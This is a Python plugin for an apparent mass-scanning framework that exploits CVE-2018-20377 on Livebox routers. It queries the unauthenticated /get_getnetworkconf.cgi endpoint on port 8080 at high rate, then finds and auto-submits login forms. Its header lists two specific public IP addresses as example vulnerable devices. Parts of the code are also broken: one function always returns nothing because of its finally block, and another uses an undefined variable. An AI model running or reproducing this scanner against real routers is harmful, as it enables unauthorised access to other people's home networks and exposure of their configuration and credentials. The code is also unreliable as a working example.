#!/usr/bin/env python3.5
# -*- coding: utf-8 -*-

"""
*---------------*
|CVE-2018-20377 |
*---------------*
Sources:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20377
https://www.cvedetails.com/cve/CVE-2018-20377/
https://github.com/zadewg/LIVEBOX-0DAY
https://nvd.nist.gov/vuln/detail/CVE-2018-20377

livebox:
*	http://89.129.126.167:8080/get_getnetworkconf.cgi
*	http://70.40.245.92:8080/get_getnetworkconf.cgi

"""
import requests
import core.logger as log
from plugins.IPlugin import IPlugin
from bs4 import BeautifulSoup

keywords = ['log',
			'user',
			'usr',
			'pass',
			'pw']

def check_if_login_form(input):
	if input.has_attr('type') and input['type'] == 'password':
		return True
	if input.has_attr('name'):
		for word in keywords:
			if word in input['name']:
				return True
	return False

def find_forms(page):
	fields = {}
	try:
		for form in page.findAll('form'):
			if not form.has_attr('action'):
				continue
			action = form['action']
			is_login_form = False
			for input in form.find_all('input'):
				is_login_form = check_if_login_form(input)

				# ignore submit/images with no name attributes
				if input['type'] in ('submit', 'image') and not input.has_attr('name'):
					continue

				# single element vname/bvalue fields
				if input['type'] in ('text', 'hidden', 'password', 'submit', 'image'):
					value = ''
					if input.has_attr('value'):
						value = input['value']
					if input.has_attr('name'):
						fields[input['name']] = value
					continue

				# checkboxes and ratios
				if input['type'] in ('checkbox', 'radio'):
					value = ''
					if input.has_key('checked'):
						if input.has_key('value'):
							value = input['value']
						else:
							value = 'on'
					'''
					if fields.has_key(input['name']) and value:
						fields[input['name']] = value
					if not fields.has_key(input['name']):
						fields[input['name']] = value
					'''
					continue
			if is_login_form:
				return action, fields
	except Exception as e: log.err(e)
	finally:
		return None, None

def post_login(url, body):
	log.info("Attempt to LOGIN to {} -> {}".format(url, body))
	res = None
	try:
		res = requests.post(url, data = body)
	except ConnectionError: log.err("Connexion error from ",url)
	except HTTPError:  log.err("Connexion error from ",url)
	except Exception as e: log.err('Error {} -> {}'.format(addr, e))
	finally:
		return res

class Plugin(IPlugin):
	def __init__(self):
		super().__init__()
		self.port = 8080
		self.relative_url = "/get_getnetworkconf.cgi"
		self.max_workers = 10
		self.max_rate = 200

	def config(self):
		pass

	def exec(self, res):
		page = BeautifulSoup(res.text, 'html.parser')
		if page:
			action, body = find_forms(page)
			if action and body:
				log.info(action, body)
				res = post_login('{}{}'.format(res.url, action), body)
				log.info("Got response {} from LOGIN {}".format(res.status_code, res.url))
